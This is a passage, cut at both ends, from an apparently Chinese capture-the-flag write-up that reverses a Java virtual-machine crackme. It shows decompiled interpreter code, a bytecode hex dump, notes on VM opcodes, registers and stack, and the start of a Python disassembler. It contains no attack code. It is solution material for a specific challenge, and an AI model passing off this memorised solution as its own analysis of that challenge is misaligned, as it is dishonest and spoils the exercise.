class="number">1</span>];</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Byte.MAX_VALUE:</span><br><span class="line">                    bufferedReader.close();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b18</span> <span class="operator">=</span> flag[i];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b19</span> <span class="operator">=</span> flag[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b20</span> <span class="operator">=</span> flag[i + <span class="number">2</span>];</span><br><span class="line">                    flag[i] = (<span class="type">byte</span>) ((flag[i] ^ b19) ^ b20);</span><br><span class="line">                    flag[i + <span class="number">1</span>] = (<span class="type">byte</span>) ((flag[i] ^ b18) ^ b20);</span><br><span class="line">                    flag[i + <span class="number">2</span>] = (<span class="type">byte</span>) ((flag[i + <span class="number">1</span>] ^ b18) ^ b19);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>code.jvm(二进制文件)</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">36</span> <span class="number">20</span> <span class="number">36</span> <span class="number">3</span>E <span class="number">22</span> <span class="number">22</span> <span class="number">08</span> <span class="number">00</span> <span class="number">0</span>A <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">08</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">02</span> <span class="number">20</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">01</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">12</span> <span class="number">2</span>B <span class="number">2</span>C <span class="number">36</span> <span class="number">53</span> <span class="number">36</span> <span class="number">45</span> <span class="number">36</span></span><br><span class="line"><span class="attribute">59</span> <span class="number">22</span> <span class="number">22</span> <span class="number">22</span> <span class="number">7</span>F <span class="number">36</span> <span class="number">4</span>F <span class="number">36</span> <span class="number">4</span>E <span class="number">22</span> <span class="number">22</span> <span class="number">7</span>F <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span></span><br><span class="line"><span class="attribute">7D</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">09</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">36</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span></span><br><span class="line"><span class="attribute">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">0</span>A <span class="number">0</span>C <span class="number">02</span> <span class="number">63</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">15</span> <span class="number">0</span>C</span><br><span class="line"><span class="attribute">02</span> <span class="number">61</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">08</span></span><br><span class="line"><span class="attribute">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">01</span> <span class="number">09</span> <span class="number">01</span> <span class="number">01</span> <span class="number">08</span> <span class="number">02</span> <span class="number">07</span> <span class="number">09</span> <span class="number">00</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">01</span></span><br><span class="line"><span class="attribute">2A</span> <span class="number">02</span> <span class="number">6</span>A <span class="number">08</span> <span class="number">00</span> <span class="number">02</span> <span class="number">0</span>D <span class="number">00</span> <span class="number">01</span> <span class="number">0</span>D <span class="number">01</span> <span class="number">01</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span></span><br><span class="line"><span class="attribute">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">73</span> <span class="number">2</span>A</span><br><span class="line"><span class="attribute">01</span> <span class="number">25</span> <span class="number">35</span> <span class="number">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">03</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">6</span>B <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">01</span> <span class="number">0</span>C</span><br><span class="line"><span class="attribute">01</span> <span class="number">03</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">70</span> <span class="number">2</span>A <span class="number">01</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">07</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">62</span></span><br><span class="line"><span class="attribute">2A</span> <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">04</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">30</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">03</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">0</span>B <span class="number">0</span>C <span class="number">03</span> <span class="number">6</span>B <span class="number">2</span>A <span class="number">03</span></span><br><span class="line"><span class="attribute">25</span> <span class="number">35</span> <span class="number">03</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">04</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">30</span> <span class="number">2</span>A <span class="number">03</span> <span class="number">25</span> <span class="number">35</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span></span><br><span class="line"><span class="attribute">13</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">57</span> <span class="number">2</span>A <span class="number">01</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span></span><br><span class="line"><span class="attribute">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">1</span>A <span class="number">0</span>C <span class="number">02</span> <span class="number">54</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">04</span> <span class="number">0</span>C</span><br><span class="line"><span class="attribute">02</span> <span class="number">30</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">07</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">2</span>C <span class="number">2</span>A <span class="number">01</span> <span class="number">25</span></span><br><span class="line"><span class="attribute">35</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">0</span>F <span class="number">0</span>C <span class="number">01</span> <span class="number">5</span>E <span class="number">2</span>A <span class="number">01</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F</span><br><span class="line"><span class="attribute">2A</span> <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">29</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">2</span>C <span class="number">2</span>A <span class="number">01</span> <span class="number">25</span> <span class="number">35</span> <span class="number">02</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">02</span> <span class="number">27</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">48</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">2</span>D <span class="number">0</span>C <span class="number">02</span></span><br><span class="line"><span class="attribute">4C</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span></span><br><span class="line"><span class="attribute">07</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">29</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">01</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">23</span> <span class="number">0</span>C <span class="number">01</span> <span class="number">41</span> <span class="number">2</span>A</span><br><span class="line"><span class="attribute">01</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">5</span>F <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">02</span> <span class="number">0</span>C <span class="number">02</span> <span class="number">2</span>C <span class="number">0</span>C</span><br><span class="line"><span class="attribute">02</span> <span class="number">48</span> <span class="number">2</span>A <span class="number">02</span> <span class="number">25</span> <span class="number">35</span> <span class="number">03</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">04</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">30</span> <span class="number">2</span>A <span class="number">03</span> <span class="number">25</span></span><br><span class="line"><span class="attribute">35</span> <span class="number">03</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">03</span> <span class="number">68</span> <span class="number">2</span>A <span class="number">03</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">1</span>C</span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">5</span>B <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">7</span>B <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">46</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">54</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">43</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">73</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">72</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">75</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">65</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">74</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">61</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span> <span class="number">0</span>C <span class="number">00</span> <span class="number">6</span>D <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">35</span> <span class="number">00</span></span><br><span class="line"><span class="attribute">0C</span> <span class="number">00</span> <span class="number">61</span> <span class="number">2</span>A <span class="number">00</span> <span class="number">25</span> <span class="number">2</span>B <span class="number">1</span>B</span><br></pre></td></tr></table></figure><p>可以看出vm的基本特征，即：</p><p>一个switch加一堆case<br>这是在判断这一个字节的指令是什么，然后执行相应指令</p><p>所以，给出了程序，我们需要逆向模拟器推出每一个指令是什么意思，然后把指令还原。同时，一般还会模拟寄存器和栈结构来读取数据，所以还要找到这两个结构才好理解。</p><p>所以，化简代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (i &lt; code.length) &#123;</span><br><span class="line">            <span class="keyword">switch</span> (code[i]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b</span> <span class="operator">=</span> code[i];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b2</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> reg[b];</span><br><span class="line">                    reg[b] = reg[b2];</span><br><span class="line">                    reg[b2] = i3;</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b3</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b3] = reg[b3] + code[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b4</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b4] = reg[b4] + reg[code[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b5</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b5] = reg[b5] - code[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b6</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b6] = reg[b6] - reg[code[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">16</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b7</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b7] = reg[b7] * code[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">17</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b8</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b8] = reg[b8] * reg[code[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">20</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b9</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b9] = reg[b9] / code[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">21</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b10</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b10] = reg[b10] / reg[code[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">24</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b11</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b11] = reg[b11] % code[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">25</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b12</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b12] = reg[b12] % reg[code[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">28</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b13</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b13] = reg[b13] &lt;&lt; code[i + <span class="number">2</span>];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">29</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b14</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    reg[b14] = reg[b14] &lt;&lt; reg[code[i + <span class="number">2</span>]];</span><br><span class="line">                    i += <span class="number">3</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">31</span>:</span><br><span class="line">                    reg[code[i + <span class="number">1</span>]] = bufferedReader.read();</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">32</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> i2;</span><br><span class="line">                    i2++;</span><br><span class="line">                    stack[i4] = bufferedReader.read();</span><br><span class="line">                    i++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">33</span>:</span><br><span class="line">                    System.out.print((<span class="type">char</span>) reg[code[i + <span class="number">1</span>]]);</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">34</span>:</span><br><span class="line">                    i2--;</span><br><span class="line">                    System.out.print((<span class="type">char</span>) stack[i2]);</span><br><span class="line">                    i++;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">41</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b15</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b16</span> <span class="operator">=</span> code[i + <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span> (reg[b15] == <span class="number">0</span>) &#123;</span><br><span class="line">                        i = b16;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        i += <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">42</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b17</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b18</span> <span class="operator">=</span> code[i + <span class="number">2</span>];</span><br><span class="line">                    <span class="keyword">if</span> (reg[b17] != <span class="number">0</span>) &#123;</span><br><span class="line">                        i = b18;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        i += <span class="number">3</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">43</span>:</span><br><span class="line">                    i = code[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">52</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> i2;</span><br><span class="line">                    i2++;</span><br><span class="line">                    stack[i5] = reg[code[i + <span class="number">1</span>]];</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">53</span>:</span><br><span class="line">                    i2--;</span><br><span class="line">                    reg[code[i + <span class="number">1</span>]] = stack[i2];</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">54</span>:</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> i2;</span><br><span class="line">                    i2++;</span><br><span class="line">                    stack[i6] = code[i + <span class="number">1</span>];</span><br><span class="line">                    i += <span class="number">2</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> Byte.MAX_VALUE:</span><br><span class="line">                    bufferedReader.close();</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b19</span> <span class="operator">=</span> code[i];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b20</span> <span class="operator">=</span> code[i + <span class="number">1</span>];</span><br><span class="line">                    <span class="type">byte</span> <span class="variable">b21</span> <span class="operator">=</span> code[i + <span class="number">2</span>];</span><br><span class="line">                    code[i] = (<span class="type">byte</span>) ((code[i] ^ b20) ^ b21);</span><br><span class="line">                    code[i + <span class="number">1</span>] = (<span class="type">byte</span>) ((code[i] ^ b19) ^ b21);</span><br><span class="line">                    code[i + <span class="number">2</span>] = (<span class="type">byte</span>) ((code[i + <span class="number">1</span>] ^ b19) ^ b20);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>改写代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(code):</span><br><span class="line">b0 = code[i]</span><br><span class="line">b1 = code[i + <span class="number">1</span>] <span class="keyword">if</span> i + <span class="number">1</span> &lt; <span class="built_in">len</span>(code) <span class="keyword">else</span> <span class="number">0xff</span></span><br><span class="line">b2 = code[i + <span class="number">2</span>] <span class="keyword">if</span> i + <span class="number">2</span> &lt; <span class="built_in">len</span>(code) <span class="keyword">else</span> <span class="number">0xff</span></span><br><span class="line"><span class="keyword">if</span> b0 == <span class="number">0</span> <span class="keyword">or</span> b0 == <span class="number">1</span> <span class="keyword">or</span> b0 == <span class="number">2</span> <span class="keyword">or</span> b0 == <span class="number">3</span>:</span><br><span class="line">fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    swap r<span class="subst">&#123;b0&#125;</span> r<span class="subst">&#123;b1&#125;</span>\n&quot;</span>)</span><br><span class="line">i += <span class="number">2</span></span><br><span class="line"><span class="keyword">elif</span> b0 == <span class="number">8</span>:</span><br><span class="line">fq.write(<span class="string">f&quot;<span class="subst">&#123;i&#125;</span>    r<span class="subst">&#123;b1&#125;</span> += 